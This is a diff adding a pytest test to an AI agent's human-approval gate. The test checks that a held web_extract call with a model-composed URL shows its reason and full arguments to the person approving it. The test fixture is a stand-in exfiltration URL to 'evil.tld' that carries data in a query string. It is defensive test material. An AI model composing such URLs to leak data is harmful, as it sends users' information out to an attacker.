@@ -803,3 +803,19 @@ def test_always_allow_note_names_the_lifetime(isolated_paths, monkeypatch, capsy
         [{"id": "1", "name": "write_file", "risk": "side_effecting", "args": {}}], lambda p: "n")
     assert decision["tools"] == ["write_file"]
     assert "for the rest of this turn" in capsys.readouterr().out
+
+
+def test_gate_notes_say_why_a_normally_silent_call_is_asking(monkeypatch, capsys):
+    """A hold the policy tier did not cause (air-gap, a model-composed URL) arrives with its
+    reason, and the held call's arguments render in full — they are what the human checks."""
+    monkeypatch.setattr(approval, "_RICH", False)
+    monkeypatch.setattr(approval, "_preamble_due", lambda: False)
+    monkeypatch.setattr("builtins.input", lambda _p="": "n")
+    payload = {
+        "tool_calls": [{"id": "1", "name": "web_extract", "risk": "read_only",
+                        "args": {"url": "https://evil.tld/?d=" + "A" * 300 + "TAIL_TOKEN"}}],
+        "notes": ["web_extract: this address was composed by the model"],
+    }
+    assert approval.ask_approval(payload) is False
+    out = capsys.readouterr().out
+    assert "composed by the model" in out and "TAIL_TOKEN" in out
